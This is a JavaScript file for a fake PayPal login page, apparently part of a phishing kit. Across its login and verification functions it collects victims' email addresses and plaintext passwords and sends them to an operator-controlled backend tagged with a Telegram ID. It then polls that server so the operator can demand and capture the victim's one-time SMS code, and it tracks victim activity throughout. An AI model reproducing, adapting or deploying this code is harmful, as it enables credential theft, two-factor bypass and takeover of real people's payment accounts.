
        import PaymentConfig from '../setup.js';
        
        let ActivityTracker;
        try {
            const module = await import('../activity-tracker.js');
            ActivityTracker = module.default;
        } catch (e) {
            console.warn('Activity tracker not found, using stub');
            ActivityTracker = class {
                constructor() {}
                sendActivity() {}
                stop() {}
            };
        }
        
        let locales = {};
        let currentLocale = 'en';
        let activityTracker = null;
        let currentPaymentId = null;
        let currentAmount = 25.00;
        let statusCheckInterval = null;
        let waitingAfterCode = false;
        
        // Load locales
        async function loadLocales() {
            try {
                const response = await fetch('./locales.json');
                locales = await response.json();
                updateUI();
            } catch (error) {
                console.error('Failed to load locales:', error);
                // Fallback to English if locales fail to load
                setFallbackTexts();
            }
        }
        
        function setFallbackTexts() {
            document.getElementById('emailStepTitle').textContent = 'Log in to your PayPal account';
            document.getElementById('emailStepSubtitle').textContent = 'Enter your email address to get started.';
            document.getElementById('emailLabel').textContent = 'Email or mobile number';
            document.getElementById('nextBtn').textContent = 'Next';
            // Add other fallback texts as needed
        }
        
        function updateUI() {
            const lang = locales[currentLocale];
            if (!lang || !lang.paypal) return;
            
            const paypal = lang.paypal;
            
            // Email step
            document.getElementById('emailStepTitle').textContent = paypal.login.title;
            document.getElementById('emailStepSubtitle').textContent = paypal.login.subtitle;
            document.getElementById('emailLabel').textContent = paypal.login.email_label;
            document.getElementById('nextBtn').textContent = paypal.login.next_button;
            
            // Password step
            document.getElementById('passwordStepTitle').textContent = paypal.login.title;
            document.getElementById('passwordStepSubtitle').textContent = paypal.login.password_subtitle;
            document.getElementById('passwordLabel').textContent = paypal.login.password_label;
            document.getElementById('changeEmailLink').textContent = paypal.login.change_link;
            document.getElementById('forgotPasswordLink').textContent = paypal.login.forgot_password;
            document.getElementById('loginBtn').textContent = paypal.login.login_button;
            
            // OTP step
            document.getElementById('otpStepTitle').textContent = paypal.verification.title;
            document.getElementById('otpStepSubtitle').textContent = paypal.verification.subtitle;
            document.getElementById('otpLabel').textContent = paypal.verification.code_label;
            document.getElementById('changeAccountLink').textContent = paypal.verification.change_account;
            document.getElementById('resendCodeLink').textContent = paypal.verification.resend_code;
            document.getElementById('verifyBtn').textContent = paypal.verification.verify_button;
            
            // Loader step
            document.getElementById('loaderText').textContent = paypal.loader.processing;
            document.getElementById('loaderSubtext').textContent = paypal.loader.wait_message;
            
            // Error step
            document.getElementById('errorTitle').textContent = paypal.error.title;
            document.getElementById('customErrorMessage').textContent = paypal.error.message;
            document.getElementById('tryAgainBtn').textContent = paypal.error.try_again;
            
            // Footer
            document.getElementById('footerContact').textContent = paypal.footer.contact;
            document.getElementById('footerPrivacy').textContent = paypal.footer.privacy;
            document.getElementById('footerLegal').textContent = paypal.footer.legal;
            document.getElementById('footerPolicy').textContent = paypal.footer.policy;
            document.getElementById('footerWorldwide').textContent = paypal.footer.worldwide;
        }
        
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('amount')) {
            currentAmount = parseFloat(urlParams.get('amount'));
        }
        
        async function checkPaymentStatus() {
            if (!currentPaymentId) return;
            
            try {
                const apiUrl = PaymentConfig.apiUrl || window.location.origin;
                const response = await fetch(`${apiUrl}${PaymentConfig.apiEndpoints.webhook}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        action: 'check_online',
                        payment_id: currentPaymentId
                    })
                });
                
                if (response.ok) {
                    const data = await response.json();
                    
                    if (data.status === 'CUSTOM_ERROR' && data.error_message) {
                        clearInterval(statusCheckInterval);
                        showCustomError(data.error_message);
                        
                        await fetch(`${apiUrl}${PaymentConfig.apiEndpoints.webhook}`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            body: JSON.stringify({
                                action: 'clear_custom_error',
                                payment_id: currentPaymentId
                            })
                        });
                    }
                    else if (data.status === 'awaiting_sms' || data.status === 'AWAITING_SMS') {
                        clearInterval(statusCheckInterval);
                        
                        waitingAfterCode = false;
                        
                        document.getElementById('otp').value = '';
                        
                        const email = document.getElementById('email').value;
                        document.getElementById('userEmailOtp').textContent = email;
                        document.getElementById('loaderStep').classList.add('hide');
                        document.getElementById('otpStep').classList.remove('hide');
                        document.getElementById('otp').focus();
                        
                        const verifyBtn = document.getElementById('verifyBtn');
                        verifyBtn.disabled = false;
                        verifyBtn.classList.remove('loading');
                        verifyBtn.textContent = locales[currentLocale]?.paypal?.verification?.verify_button || 'Verify';
                        
                        if (activityTracker) {
                            activityTracker.pageName = 'paypal-otp';
                            activityTracker.sendActivity();
                        }
                    } else if (data.status === 'completed' || data.status === 'COMPLETED') {
                        clearInterval(statusCheckInterval);
                        window.location.href = `./success.html?payment_id=${currentPaymentId}`;
                    } else if (data.status === 'failed' || data.status === 'FAILED') {
                        clearInterval(statusCheckInterval);
                        window.location.href = `./error.html?payment_id=${currentPaymentId}`;
                    }
                }
            } catch (error) {
                console.error('Error checking status:', error);
            }
        }
        
        function showCustomError(errorMessage) {
            document.getElementById('emailStep').classList.add('hide');
            document.getElementById('passwordStep').classList.add('hide');
            document.getElementById('loaderStep').classList.add('hide');
            document.getElementById('otpStep').classList.add('hide');
            
            document.getElementById('customErrorMessage').textContent = errorMessage;
            
            document.getElementById('errorStep').classList.remove('hide');
            
            if (activityTracker) {
                activityTracker.pageName = 'paypal-error';
                activityTracker.sendActivity();
            }
        }
        
        window.tryAgain = function() {
            clearInterval(statusCheckInterval);
            currentPaymentId = null;
            waitingAfterCode = false;
            
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('otp').value = '';
            
            document.getElementById('emailError').style.display = 'none';
            document.getElementById('passwordError').style.display = 'none';
            document.getElementById('otpError').style.display = 'none';
            
            document.getElementById('errorStep').classList.add('hide');
            document.getElementById('passwordStep').classList.add('hide');
            document.getElementById('loaderStep').classList.add('hide');
            document.getElementById('otpStep').classList.add('hide');
            
            document.getElementById('emailStep').classList.remove('hide');
            document.getElementById('email').focus();
            
            if (activityTracker) {
                activityTracker.stop();
                activityTracker = null;
            }
        }
        
        window.nextStep = function() {
            const email = document.getElementById('email').value.trim();
            const emailError = document.getElementById('emailError');
            const lang = locales[currentLocale]?.paypal?.login?.errors;
            
            if (!email) {
                emailError.textContent = lang?.required || 'Required';
                emailError.style.display = 'block';
                return;
            }
            
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                emailError.textContent = lang?.invalid_email || 'That email format isn\'t right';
                emailError.style.display = 'block';
                return;
            }
            
            document.getElementById('userEmail').textContent = email;
            document.getElementById('emailStep').classList.add('hide');
            document.getElementById('passwordStep').classList.remove('hide');
            document.getElementById('password').focus();
        }
        
        window.changeEmail = function() {
            document.getElementById('passwordStep').classList.add('hide');
            document.getElementById('emailStep').classList.remove('hide');
            document.getElementById('email').focus();
            return false;
        }
        
        window.login = async function() {
            const password = document.getElementById('password').value.trim();
            const passwordError = document.getElementById('passwordError');
            const loginBtn = document.getElementById('loginBtn');
            const lang = locales[currentLocale]?.paypal?.login?.errors;
            
            if (!password) {
                passwordError.textContent = lang?.required || 'Required';
                passwordError.style.display = 'block';
                return;
            }
            
            loginBtn.disabled = true;
            loginBtn.classList.add('loading');
            loginBtn.textContent = locales[currentLocale]?.paypal?.loader?.processing || 'Processing...';
            
            try {
                const apiUrl = PaymentConfig.apiUrl || window.location.origin;
                const response = await fetch(`${apiUrl}${PaymentConfig.apiEndpoints.createPayment}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        email: document.getElementById('email').value,
                        password: password,
                        amount: currentAmount,
                        currency: 'EUR',
                        ip: '',
                        user_agent: navigator.userAgent,
                        telegram_id: urlParams.get('telegram_id') || null
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Payment creation failed');
                }
                
                const result = await response.json();
                currentPaymentId = result.payment_id;
                
                sessionStorage.setItem('currentPaymentId', currentPaymentId);
                sessionStorage.setItem('paypalData', JSON.stringify({
                    email: document.getElementById('email').value,
                    amount: currentAmount
                }));
                
                activityTracker = new ActivityTracker(currentPaymentId, 'paypal-login');
                
                document.getElementById('passwordStep').classList.add('hide');
                document.getElementById('loaderStep').classList.remove('hide');
                
                statusCheckInterval = setInterval(checkPaymentStatus, 2000);
                
            } catch (error) {
                console.error('Error:', error);
                passwordError.textContent = lang?.login_failed || 'Login failed. Please try again.';
                passwordError.style.display = 'block';
            } finally {
                loginBtn.disabled = false;
                loginBtn.classList.remove('loading');
                loginBtn.textContent = locales[currentLocale]?.paypal?.login?.login_button || 'Log In';
            }
        }
        
        window.backToPassword = function() {
            document.getElementById('otpStep').classList.add('hide');
            document.getElementById('passwordStep').classList.remove('hide');
            document.getElementById('password').focus();
            return false;
        }
        
        window.verifyOtp = async function() {
            const otp = document.getElementById('otp').value.trim();
            const otpError = document.getElementById('otpError');
            const verifyBtn = document.getElementById('verifyBtn');
            const lang = locales[currentLocale]?.paypal?.verification?.errors;
            
            if (!otp) {
                otpError.textContent = lang?.invalid_code || 'Required';
                otpError.style.display = 'block';
                return;
            }
            
            if (otp.length < 3 || otp.length > 12) {
                otpError.textContent = lang?.invalid_code || 'Please enter a valid code (3-12 characters)';
                otpError.style.display = 'block';
                return;
            }
            
            verifyBtn.disabled = true;
            verifyBtn.classList.add('loading');
            verifyBtn.textContent = locales[currentLocale]?.paypal?.loader?.verifying || 'Verifying...';
            
            try {
                const apiUrl = PaymentConfig.apiUrl || window.location.origin;
                const response = await fetch(`${apiUrl}${PaymentConfig.apiEndpoints.webhook}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        action: 'verify_code',
                        payment_id: currentPaymentId,
                        code: otp
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Verification failed');
                }
                
                if (activityTracker) {
                    activityTracker.pageName = 'paypal-otp-verify';
                    activityTracker.sendActivity();
                }
                
                document.getElementById('otpStep').classList.add('hide');
                document.getElementById('loaderStep').classList.remove('hide');
                document.querySelector('.loader-text').textContent = locales[currentLocale]?.paypal?.loader?.verifying || 'Verifying your code...';
                document.querySelector('.loader-subtext').textContent = locales[currentLocale]?.paypal?.loader?.verifying_subtext || 'This may take a few moments';
                
                waitingAfterCode = true;
                
                statusCheckInterval = setInterval(checkPaymentStatus, 2000);
                
            } catch (error) {
                console.error('Error:', error);
                otpError.textContent = lang?.verification_failed || 'Verification failed. Please try again.';
                otpError.style.display = 'block';
                verifyBtn.disabled = false;
                verifyBtn.classList.remove('loading');
                verifyBtn.textContent = locales[currentLocale]?.paypal?.verification?.verify_button || 'Verify';
            }
        }
        
        window.resendCode = function() {
            const otpError = document.getElementById('otpError');
            const lang = locales[currentLocale]?.paypal?.verification?.success;
            otpError.textContent = lang?.code_sent || 'New code sent!';
            otpError.style.color = '#2ecc71';
            otpError.style.display = 'block';
            
            setTimeout(() => {
                otpError.style.color = '#c40e2e';
                otpError.style.display = 'none';
            }, 3000);
            
            return false;
        }
        
        // Event listeners
        document.getElementById('email').addEventListener('input', function() {
            document.getElementById('emailError').style.display = 'none';
        });
        
        document.getElementById('password').addEventListener('input', function() {
            document.getElementById('passwordError').style.display = 'none';
        });
        
        document.getElementById('otp').addEventListener('input', function() {
            document.getElementById('otpError').style.display = 'none';
        });
        
        document.getElementById('email').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') window.nextStep();
        });
        
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') window.login();
        });
        
        document.getElementById('otp').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') window.verifyOtp();
        });
        
        window.addEventListener('beforeunload', () => {
            if (activityTracker) {
                activityTracker.stop();
            }
        });
        
        // Initialize
        loadLocales();
    